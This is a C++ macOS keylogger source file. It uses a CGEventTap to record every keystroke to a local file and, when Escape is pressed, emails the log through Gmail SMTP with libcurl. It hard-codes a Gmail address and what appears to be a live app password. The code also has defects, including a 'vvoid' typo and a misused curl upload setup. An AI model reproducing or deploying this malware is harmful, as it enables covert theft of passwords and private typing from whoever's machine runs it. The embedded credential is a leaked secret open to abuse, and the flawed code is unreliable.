#include <ApplicationServices/ApplicationServices.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <curl/curl.h>  // Include libcurl

// File to save key log
const char* logFile = "key_log.txt";

// Gmail SMTP server details
const char* smtp_server = "smtp://smtp.gmail.com:587"; // SMTP server and port
const char* email_user = "dennis.pidduck@gmail.com"; // Replace with your Gmail address
const char* email_password = "xglvswysuejigfhq"; // Replace with your Gmail password (use App password if 2FA is enabled)
const char* recipient_email = "dennis.pidduck@gmail.com"; // Email address where you want to receive the log

// Function to log the key to a file
vvoid logKey(const std::string& key) {
    std::ofstream file(logFile, std::ios::app);  // Open file in append mode
    if (file.is_open()) {
        time_t now = time(0);                     // Get current time
        char* dt = ctime(&now);

        // Write timestamp and key
        file << "[" << dt << "] " << key << std::endl;
        file.close();
    } else {
        std::cerr << "Unable to open log file." << std::endl;
    }
}

// Function to send the log file via email
void sendEmail() {
    CURL *curl;
    CURLcode res;
    struct curl_slist *recipients = NULL;

    curl = curl_easy_init();  // Initialize curl
    if (curl) {
        // Set SMTP server and login details
        curl_easy_setopt(curl, CURLOPT_URL, smtp_server);
        curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);  // Use TLS/SSL
        curl_easy_setopt(curl, CURLOPT_USERNAME, email_user);
        curl_easy_setopt(curl, CURLOPT_PASSWORD, email_password);

        // Set mail sender and recipient
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, email_user);
        recipients = curl_slist_append(recipients, recipient_email);
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

        // Prepare the email body with the log file as content
        std::ifstream file(logFile);
        if (!file.is_open()) {
            std::cerr << "Failed to open log file." << std::endl;
            return;
        }
        std::string logContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

        std::string email_data = "To: " + std::string(recipient_email) + "\r\n" +
                                 "From: " + std::string(email_user) + "\r\n" +
                                 "Subject: Keylogger Log\r\n" +
                                 "\r\n" + logContent;

        // Set email data
        curl_easy_setopt(curl, CURLOPT_READDATA, &email_data);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        // Perform the request
        res = curl_easy_perform(curl);

        // Check for errors
        if (res != CURLE_OK) {
            std::cerr << "Failed to send email: " << curl_easy_strerror(res) << std::endl;
        } else {
            std::cout << "Log file emailed successfully." << std::endl;
        }

        // Clean up
        curl_slist_free_all(recipients);  // Clean up recipients list
        curl_easy_cleanup(curl);          // Clean up curl session
    } else {
        std::cerr << "Curl initialization failed." << std::endl;
    }
}

// Callback function for when a key is pressed
CGEventRef keyCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* refcon) {
    if (type == kCGEventKeyDown) {
        // Get the key code
        CGKeyCode keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

        // Map keycodes to strings
    switch (keycode) {
        case 0x31: // Spacebar key
            logKey("Space");
            break;
        case 0x24: // Enter key
            logKey("Enter");
            break;
        case 0x30: // Tab key
            logKey("Tab");
            break;
        case 0x33: // Backspace key
            logKey("Backspace");
            break;
        case 0x35: // Esc key
            logKey("Escape");
            sendEmail();  
            exit(0);
            break;
        default:
            logKey("Key code: " + std::to_string(keycode));
            break;
    }
    }
    return event;
}

int main() {
    CGEventMask eventMask = (1 << kCGEventKeyDown);

    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap,               // Session-level event tap
        kCGHeadInsertEventTap,            // Insert at the head of the event queue
        kCGEventTapOptionDefault,         // Default options
        eventMask,                        // Mask for key down events
        keyCallback,                      // The callback function
        nullptr                           // No refcon needed
    );

    if (!eventTap) {
        std::cerr << "Failed to create event tap." << std::endl;
        exit(1);
    }

    // Create a run loop source and add it to the current run loop
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    // Start capturing key events
    std::cout << "Keylogger started. Press 'Esc' to stop." << std::endl;
    CFRunLoopRun(); // Start the run loop to capture events

    // Clean up
    CFRelease(runLoopSource);
    CFRelease(eventTap);

    return 0;
}